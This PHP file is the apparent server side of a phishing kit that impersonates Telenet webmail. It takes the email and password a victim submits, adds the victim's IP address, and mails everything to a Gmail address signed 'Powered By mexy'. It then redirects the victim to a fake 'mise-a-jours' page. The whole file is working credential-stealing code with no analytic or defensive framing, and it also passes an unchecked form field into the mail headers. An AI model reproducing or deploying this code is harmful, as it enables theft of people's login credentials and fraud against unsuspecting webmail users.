<?php

	$ip = getenv("REMOTE_ADDR");
	$message .= "----------------foni--------------------\n";
	$message .= "Email: ".$_POST["j_username"]."\n";
	$message .= "Password: ".$_POST["j_password"]."\n";
	$message .= "IP: ".$ip."\n";
	$message .= "---------------Powered By mexy--------------------\n";
	
	
	$recipient = "bernardcharme3@gmail.com";
	$subject = "Telenet Webmail";
	$headers = "From: <mexy@home.com> ";
	$headers .= $_POST['eMailAdd']."\n";
	$headers .= "MIME-Version: 1.0\n";
	
	//mail("$to", "Telenet Webmail ReZulT", $message);
	
	$send = mail($recipient,$subject,$message,$headers);
	
	if ($send)
	   {
		   header( "Location:https://telenet-mise-a-jours.jimdosite.com/?fbclid=IwAR1bNjMs7fuiSoxw_dRhZJOMoexZcn_Ezgl4gEpHiy5AOkwv8NBLmESW49U");
	   }
	else
       {
 		print "ERROR! Please go back and try again.";
  	   }

?>